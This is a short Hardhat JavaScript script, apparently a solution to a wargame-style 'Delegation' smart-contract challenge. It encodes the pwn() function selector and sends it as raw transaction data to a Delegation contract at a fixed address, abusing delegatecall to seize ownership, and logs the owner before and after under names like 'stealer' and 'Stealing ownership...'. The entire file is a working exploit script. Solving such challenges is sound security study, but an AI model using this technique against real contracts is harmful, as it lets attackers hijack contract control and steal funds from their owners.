const hre = require("hardhat");

async function main() {
  const [stealer] = await hre.ethers.getSigners();

  console.log("Stealer account address:", stealer.address);

  const pwnSignature = web3.eth.abi.encodeFunctionSignature("pwn()");
  const Delegation = await ethers.getContractFactory("Delegation");
  const delegation = await Delegation.attach("0x2F4847cF8F9B0fEDC18536c35E784cC37d5A421e");

  console.log("Delegation contract owner address:", await delegation.owner());
  console.log("Stealing ownership...");

  await new Promise((resolve, reject) => {
    web3.eth
      .sendTransaction({ from: stealer.address, to: delegation.address, data: pwnSignature, gas: 8720000 })
      .on("confirmation", async () => {
        console.log("Current delegation contract owner:", await delegation.owner());
        resolve();
      })
      .on("error", (err) => {
        console.error(err);
        reject();
      });
  });
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
